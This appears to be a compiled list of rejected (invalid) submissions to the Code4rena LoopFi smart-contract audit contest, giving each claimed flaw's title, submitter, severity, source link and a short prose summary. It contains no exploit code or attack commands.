- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/280
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-280.md

## Brief Summary

The `AuraVault` contract implements a vault that allows users to deposit and withdraw assets, mint and redeem shares, and compound rewards. The contract uses conversion functions [`_convertToShares`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L182-L184) and [`_convertToAssets`](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/vendor/AuraVault.sol#L189-L191) to handle the conversion between assets and shares. However, the rounding direction used in these functions is incorrect, leading to a critical vulnerability. Detailed Description The [`withdraw` function](https://github...

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, :robot:_primary

# Lack of Length validation in `setOracles` function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-302
- **Submitter:** Akay
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/302
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-302.md

## Brief Summary

The `setOracles` function in the smart contract does not validate that the input arrays `_tokens` and `_oracles` have the same length. This can lead to issues whereby if `_oracles` is shorter than `_tokens`, the function will attempt to access an out-of-bounds index in `_oracles`, causing the transaction to revert or if `_oracles` is longer than `_tokens`, the extra elements in `_oracles` will be silently ignored.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_163_group

# Division before multiplication will lead to incorrect calculation of cumulativeIndexLU

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-508
- **Submitter:** Anirruth
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/508
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-508.md

## Brief Summary

The rate will get divided first with `SECONDS_PER_YEAR`(31536000) and get rounded down to 0 which will lead to improper calculation of the `cumulativeIndexLU`.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_94_group

# Incorrect Order of Operations in `withdrawAndRepay()`

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-426
- **Submitter:** Bauchibred
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/426
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-426.md

## Brief Summary

(https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/proxy/PositionAction.sol#L254 Vulnerability details Impact If users don't have sufficient funds to repay before withdrawal, their transactions to `withdrawAndRepay()` will fail.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Based on implementation Borrow should never revert but this function makes externals call and can revert.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-342
- **Submitter:** Bigsam
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/342
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-342.md

## Brief Summary

The `borrow` function is designed not to revert based on its implementation. However, it makes an external call to the `poolV3` contract, which includes a `whenNotPaused` modifier. If the `poolV3` contract is paused, this external call will revert, causing the `borrow` function to fail unexpectedly. This issue also affects both flash loan functionality and the `cdpVault` action, potentially disrupting the protocol's operations and leading to failed transactions.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_122_group

# PoolV3 does not comply with ERC4626 standard

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-569
- **Submitter:** Brenzee
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/569
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-569.md

## Brief Summary

[`PoolV3`](https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L46-L49) is a tokenized vault contract, which should be compatible with ERC4626 standard. But because of changes in the contract compared to original `PoolV3`, `PoolV3.maxWithdraw` and `PoolV3.maxMint` functions do not comply with ERC4626 standard.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_66_group

# Pause/unpause functionalities not implemented in many pausable contracts

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-336
- **Submitter:** Centaur
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/336
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-336.md

## Brief Summary

The CDPVault and Vault Register are supposed to be pausable (they inherit from Pauseable, and ERC20Pausable) but they don't implement the external pause/unpause functionalities which means it will never be possible to pause them.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# ExitPool:: allows users to withdraw lesser single token if Balancer Pool is imbalanced

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-352
- **Submitter:** Centaur
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/352
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-352.md

## Brief Summary

Users will always receive lesser fewer tokens than they are due when exiting the pool, leading to potential financial losses.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_63_group

# `updateLeverJoin opens door for possible under-collaterized pool when providing liquidity to Balancer pool.

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-365
- **Submitter:** Centaur
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/365
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-365.md

## Brief Summary

The pool may issue more liquidity to the user than entitled to, diluting the value of tokens held by other participants.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_104_group

# UniswapV3:: ExactOutputParams and ExactInputParams swapParams recipient will be unable to receive ETH it's a secondary or primary token to be swapped

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-499
- **Submitter:** Centaur
- **Claimed severity:** High
- **Final severity:** High
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/499
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-499.md

## Brief Summary

`swapParams.recipient` will never receive any incoming ETH transfer or out going transfer. The primary impact of this bug is the potential for failed transactions or loss of ETH if the recipient address is not payable. This flaw undermines the reliability of the Uniswap V3 swap functions when dealing with ETH, leading to possible asset losses and user dissatisfaction.

## Rejection Reason

GitHub validation labels: bug, 3 (High Risk), insufficient quality report, edited-by-warden, :robot:_primary

# Lack of Adherence to Checks-Effects-Interaction Pattern in zapVestingToLp Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-629
- **Submitter:** Centaur
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/629
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-629.md

## Brief Summary

## TITLE: [M-7] Lack of Adherence to Checks-Effects-Interaction Pattern in zapVestingToLp Function **Description:** The `MultidistridbutionFee::zapVestingToLp` function in the contract is designed to allow a user to convert their vested tokens into liquidity provider tokens (LP tokens). However, this function does not adhere to the checks-effects-interaction pattern, which is crucial for preventing potential reentrancy attacks. The function performs external calls to transfer tokens and update the price provider before updating the user's balance, which could open up vulnerabilities if the external contract being called is malicious or compromised. Specifically, the function first transfers...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Users and credit managers can be unfairly liquidated if the base interest rate is suddenly changed

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-451
- **Submitter:** Cryptor
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/451
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-451.md

## Brief Summary

Detailed description of the impact of this finding.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inconsistent Flash Fee Calculation Method

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-106
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/106
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-106.md

## Brief Summary

The inconsistent calculation method may lead to discrepancies in the fee charged for flash loans. Users and integrators expecting the documented fee calculation method might find the actual fees charged by the contract to be unexpectedly higher or lower, potentially leading to a loss of trust and financial inaccuracies.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_98_group

# Inconsistent Update of `availableLiquidityDelta` in `_deposit` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-109
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/109
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-109.md

## Brief Summary

If `availableLiquidityDelta` does not correctly account for the `assetsReceived` amount, the liquidity state of the contract may be incorrect. This could lead to inconsistencies in liquidity calculations, potentially affecting the contract's ability to handle future deposits or withdrawals properly.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_71_group

# Missing Accrued Interest and Revenue Updates in _updateBaseInterest Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-112
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/112
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-112.md

## Brief Summary

The absence of updates for accrued interest and accrued revenue can lead to discrepancies in the calculations of the base interest rate and expected liquidity. This may cause incorrect financial calculations, potentially resulting in unintended financial outcomes or misalignment with the intended economic model of the contract.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inconsistent Conversion from `uint128` to `uint256` in `_convertToU256` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-113
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/113
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-113.md

## Brief Summary

This inconsistency can lead to unintended behavior or errors in the smart contract where the function `_convertToU256` is used. Specifically, if the consuming code relies on receiving a `uint256` value but gets a `uint128` instead, this could cause issues with arithmetic operations, comparisons, or other logic that expects the full `uint256` precision.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_30_group

# Lack of Contract Validation in Delegate Call

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-133
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/133
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-133.md

## Brief Summary

If the `to` address is not a contract, the `delegatecall` will fail, causing the entire transaction to revert. This can disrupt the intended functionality of the contract and may lead to loss of execution continuity or unintended contract state changes. The lack of a contract check makes it harder to diagnose the issue and handle such failures gracefully.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_75_group

# Missing Slippage Checks in Critical Functions

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-136
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/136
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-136.md

## Brief Summary

Without slippage checks, these functions are vulnerable to price fluctuations, which could result in receiving significantly fewer tokens than expected. This discrepancy can lead to losses or other unintended effects, particularly in functions handling large or critical financial operations.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Front-Running Risk in `updateEpoch` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-151
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/151
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-151.md

## Brief Summary

A malicious actor can manipulate the timing of epoch updates to ensure that the rates are updated in their favor. This can lead to unfair advantages in the system, where the attacker secures better quota rates before other users are aware that an epoch update is due.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_51_group

# Incorrect `totalAllocPoint` Calculation in `batchUpdateAllocPoint` Leading to Inconsistent Pool Allocation Points

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-172
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/172
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-172.md

## Brief Summary

An incorrect `totalAllocPoint` can lead to an inaccurate distribution of rewards among pools. If the `totalAllocPoint` does not reflect the true sum of allocation points across all pools, the rewards distribution logic that relies on this value will be skewed, potentially resulting in one or more pools receiving a disproportionate share of rewards.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Incorrect Loop Termination in `setScheduledRewardsPerSecond` Function Due to Zero Offset

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-173
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/173
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-173.md

## Brief Summary

The primary impact is that the rewards schedule may not update correctly, leading to an inaccurate calculation of `rewardsPerSecond`. Since [_updateEmissions](https://github.com/code-423n4/2024-07-loopfi/blob/57871f64bdea450c1f04c9a53dc1a78223719164/src/reward/ChefIncentivesController.sol#L439-L447) is responsible for setting the correct reward rate based on the current timestamp, a failure here means that participants may receive incorrect reward amounts when they call claim. If the loop fails to execute as intended, it could result in the contract not updating the rewards schedule correctly. This could lead to incorrect rewards distribution, where the intended adjustment to the rewards pe...

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Updating pool's reward information doesn't consider users `rewardDebt `

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-174
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/174
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-174.md

## Brief Summary

The `rewardDebt` is crucial for accurately tracking rewards that each user has already earned but not yet claimed. By not considering `rewardDebt` directly in `_updatePool`, there is a risk that the rewards distributed to users might be miscalculated when users claim them, leading to potential discrepancies in reward allocations. This could result in users receiving incorrect amounts of rewards, which could undermine trust in the system and affect user satisfaction.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Negative Claimable Rewards Due to user.rewardDebt Exceeding Accumulated Rewards

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-176
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/176
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-176.md

## Brief Summary

A negative `claimable` value means that the contract allows the user to have a claimable amount that is less than zero, which could lead to incorrect reward distributions, potential overflows, or erroneous behavior in reward claiming mechanisms. This could undermine the integrity of the reward system and lead to unexpected losses or errors.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# `_processEligibility` Always Returning True Causes Universal User Disqualification in `afterLockUpdate`

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-180
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/180
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-180.md

## Brief Summary

The constant passing of `true` to `_processEligibility` function call within the `afterLockUpdate` function can cause users to be disqualified and have their emissions stopped unintentionally. This may lead to users being unfairly penalized, missing out on rewards or other benefits they were otherwise eligible to receive, which could result in loss of trust in the system and possible financial impact.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_12_group

# Incorrect Disqualification Time Assignment in `setDqTime` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-198
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/198
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-198.md

## Brief Summary

If the disqualification time is set to a future timestamp, a user might continue to receive rewards despite being ineligible, leading to an unfair distribution of rewards and potentially impacting the protocol's integrity.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inconsistent Vesting Penalty Implementation in vestTokens Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-211
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/211
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-211.md

## Brief Summary

Users may receive full rewards on the entire vested amount, even for portions that should be subject to penalties. This could result in an unfair distribution of rewards and potentially allow users to circumvent intended vesting restrictions, leading to economic imbalances within the protocol.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Overly Restrictive Time Check in `individualEarlyExit` Function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-212
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/212
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-212.md

## Brief Summary

Users are unable to withdraw their funds at the exact moment of unlocking, potentially leading to user frustration and a slight delay in fund accessibility.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_142_group

# Possible incorrect party being incentivized in `claim` function

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-345
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/345
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-345.md

## Brief Summary

The current logic could result in the incorrect party being incentivized, diminishing the effectiveness of the incentive mechanism designed to encourage users to initiate the claim process. This could reduce user engagement in the system and lead to delays in claim processing.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Potential Slippage Risk in `claim` Function Due to Lack of `minAmountOut` Consideration

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-346
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/346
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-346.md

## Brief Summary

A user could deposit an expected amount of `WETH` only to receive fewer rewards (`BAL` or `AURA`) than anticipated, which could lead to a significant loss in value due to slippage during the swaps. This discrepancy arises because the function does not verify that the output of the rewards meets a minimum expected threshold (`minAmountOut`), which would otherwise protect against adverse market conditions or price changes during the transaction.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Inconsistent Pool State Due to Separate Profit Minting and Repayment Operations

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-374
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/374
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-374.md

## Brief Summary

The primary impact of this vulnerability is the potential for significant mispricing of loans and incorrect assessment of the pool's liquidity. Due to the inconsistent pool state, interest rates may be calculated incorrectly, leading to either underpriced or overpriced loans. This could result in unfair advantages for some users while potentially causing financial losses for others or the protocol itself. The inaccurate liquidity assessment could also lead to over-borrowing, putting the pool at risk of insolvency in extreme cases.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_118_group

# `addQuotaToken` function allows non-quoted tokens to be added

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-399
- **Submitter:** Daniel526
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/399
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-399.md

## Brief Summary

If non-quoted tokens are added to the system, they will not be properly recognized by the `PoolQuotaKeeperV3` contract as part of the quota system. This could result in these tokens not contributing to or being affected by quota calculations, leading to potential revenue discrepancies and improper quota management. Non-quoted tokens might not be subject to the same quota-based restrictions or benefits, which could lead to unintended financial outcomes.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, edited-by-warden, :robot:_primary, :robot:_79_group

# Problem with external call

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-669
- **Submitter:** EPSec
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/669
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-669.md

## Brief Summary

In `PoolV3::_updateBaseInterest` an external call to `ILinearInterestRateModelV3::calcBorrowRate` is made. The implementation of `LinearInterestRateModelV3` can be found here: https://etherscan.io/address/0x86781a14F55677729b1C0394E06966BF8736bbbc#code If we look deeper, we can see that when the `isBorrowingMoreU2Forbidden` flag is true and `checkOptimalBorrowing` is set to true it shouldn't allow borrowing over `U_2`. However, due to an error in the implementation it will revert also if `U_WAD` is equal to `U_2` which from documentation is not by design and can cause random reverts in `PoolV3`.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Liquidations will not be possible once oracle price is 0

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-766
- **Submitter:** ElCid
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/766
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-766.md

## Brief Summary

In the unlikely case that the price returned by the oracle is 0, unhealthy positions with or without bad debt won't be liquidatable because all the oracles revert with that value. If this ever happens, it is critical for `CDPVault` to be able to liquidate all of the unhealthy positions, so that losses don't grow and insolvency can be avoided.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_49_group

# No refund to the user if the amount paid is greater than the repayment amount

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-700
- **Submitter:** Hajime
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/700
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-700.md

## Brief Summary

If the user contributes more to repayment than the debt itself. The difference is not returned to him. The design of the protocol assumes that the user will deposit the exact amount, but it cannot be ruled out that the opposite may happen and the user may lose his funds

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_53_group

# Insecure Access Control in CDPVault.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-692
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/692
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-692.md

## Brief Summary

CDPVault.sol is using an unsafe access control mechanism. The `accessControl` mechanism provided by OpenZeppelin is used in this contract, which casts the role as `bytes32` hash of a certain string. The role system has the capabilities to regulate authentication permissions. However, the smart contract is using the keccak256 hash of certain role names. If a collision of hashes occurs, it may allow an unauthorised individual access to these sensitive functions. These roles include: `VAULT_CONFIG_ROLE`, `VAULT_UNWINDER_ROLE`, `DEFAULT_ADMIN_ROLE`, and `PAUSER_ROLE`.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Exposure to Unpriceable Tokens in CDPVault.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-699
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/699
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-699.md

## Brief Summary

The `token` in the smart contract is not required to comply with a specific interface. Particularly, the token does not need a price feed. Hence, it may be possible to provide unpriceable tokens in the CDPVault, which can lead to position manipulation and imbalanced debt positions. The issue is in this piece of code: In the constructor of `CDPVault`, the contract expects the ERC-20 tokens from constants passed. However, there is no check if the token has a corresponding price feed in the oracle's smart contract.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary

# Lack of Input Validation in Flashlender.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-720
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/720
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-720.md

## Brief Summary

The contract Flashlender.sol does not validate the `amount` parameter from `flashLoan` and `creditFlashLoan` functions before use. This means, a malicious user could provide an excessive loan amount causing potential overflow issues.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_26_group

# Unchecked Return Values in Flashlender.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-724
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/724
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-724.md

## Brief Summary

In the `flashLoan` and `creditFlashLoan` functions, there is an external call to `receiver.onFlashLoan` and `receiver.onCreditFlashLoan` methods respectively. However, the return values of these functions are not being checked for correctness, resulting in potential issues if these functions do not complete as expected. There is a check against the `CALLBACK_SUCCESS` and `CALLBACK_SUCCESS_CREDIT` constants but that's insufficient as the receiver's contract might contain an error and still return the correct constant.

## Rejection Reason

GitHub validation labels: bug, 2 (Med Risk), insufficient quality report, :robot:_primary, :robot:_52_group

# PoolV3.sol is not fully up to EIP-4626's specification

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Submission:** V-746
- **Submitter:** JC
- **Claimed severity:** Medium
- **Final severity:** Medium
- **Status:** invalid
- **Rejection category:** other
- **Source URL:** https://github.com/code-423n4/2024-07-loopfi-validation/issues/746
- **Source snapshot:** competitions/2024-07-loopfi/submissions/raw/V-746.md

## Brief Summary

